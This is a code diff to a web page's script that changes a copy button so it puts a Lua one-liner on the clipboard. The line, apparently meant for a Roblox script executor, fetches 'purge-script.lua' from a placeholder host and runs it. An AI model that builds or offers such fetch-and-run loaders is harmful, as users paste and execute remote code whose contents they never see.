@@ -69,12 +69,12 @@
   <script>
     const copyBtn = document.getElementById('copyBtn');
     const btnText = document.getElementById('btnText');
-    const paragraphText = document.getElementById('paragraph').innerText;
+    const loadstringText = "loadstring(game:HttpGet('https://example.com/purge-script.lua'))()";
 
     copyBtn.addEventListener('click', () => {
       // Create a temporary textarea element to hold the text
       const textarea = document.createElement('textarea');
-      textarea.value = paragraphText;
+      textarea.value = loadstringText;
       document.body.appendChild(textarea);
 
       // Select the text in the textarea
